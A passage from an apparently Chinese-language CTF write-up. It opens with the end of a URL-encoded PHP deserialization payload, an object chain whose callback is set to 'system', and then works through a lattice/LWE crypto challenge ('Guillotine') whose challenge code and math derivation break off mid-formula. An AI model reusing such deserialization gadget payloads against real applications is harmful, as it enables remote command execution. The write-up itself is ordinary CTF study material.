/flag&amp;file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ez_upload"><a class="markdownIt-Anchor" href="#ez_upload"></a> ez_upload*</h2><p>简单弄了一下，没啥思路，做密码去了……</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="guillotine"><a class="markdownIt-Anchor" href="#guillotine"></a> Guillotine</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;**************************&#125;&#x27;</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line">e = [choice(<span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br><span class="line">    B.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;give you B:&quot;</span>,B)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The time for defiance is over. Provide the encryption key, and you shall be granted the mercy of a swift end. Refuse, and your death will be prolonged.&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)) == secret</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Do you really think I would let you go? <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>e</code>是随机的小误差<code>[-3,3]</code><br />A是个三维数组</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        *<span class="number">36</span></span><br><span class="line">        [,]</span><br><span class="line">    ],</span><br><span class="line">    *<span class="number">50</span></span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        ...</span><br><span class="line">        [,]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里<strong>随机数种子固定</strong>，因此<code>A</code>是已知的(不知道为什么<code>sage</code>跑不了<code>random</code>，用<code>Python</code>跑完直接套进去即可)</p><p><code>b</code>就是看<code>secret(36位)</code>移位后的奇偶情况决定取最小的数组里面的第零个还是第一个，并求和，最后再加上一个误差e再模p</p><p>到这一步就要朝<strong>LWE</strong>方向思考了，形如<code>B=A·s+e</code>，但目前无法构造这样的等式</p><p>有个小技巧</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>因为</mtext><msub><mi>s</mi><mi>j</mi></msub><mo>=</mo><mn>0</mn><mi mathvariant="normal">/</mi><mn>1</mn><mtext>有，</mtext><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><msub><mi>s</mi><mi>j</mi></msub></mrow></msub><mo>=</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo separator="true">⋅</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>s</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">⋅</mo><msub><mi>s</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">因为s_{j}=0/1有，A_{i,j,s_{j}}=A_{i,j,0}·(1-s_{j})+A_{i,j,1}·s_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0973199999999999em;vertical-align:-0.34731999999999996em;"></span><span class="mord">0</span><span class="mord">/</span><span class="mord">1</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166400000000005em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.34731999999999996em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo>≡</mo><mrow><mo fence="true">(</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mi>j</mi></msub><mo separator="true">⋅</mo><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_{i}\equiv \left(\sum_{j=0}^{n-1}(A_{i,j,0}+s_{j}·(A_{i,j,1}-A_{i,j,0}))+e_{i}\right)\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo>−</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>≡</mo><mrow><mo fence="true">(</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>s</mi><mi>j</mi></msub><mo separator="true">⋅</mo><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\equiv \left(\sum_{j=0}^{n-1}s_{j}·(A_{i,j,1}-A_{i,j,0})+e_{i}\right)\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令，</mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>≡</mo><msub><mi>b</mi><mi>i</mi></msub><mo>−</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">令，b&#x27;_{i}\equiv b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="mop 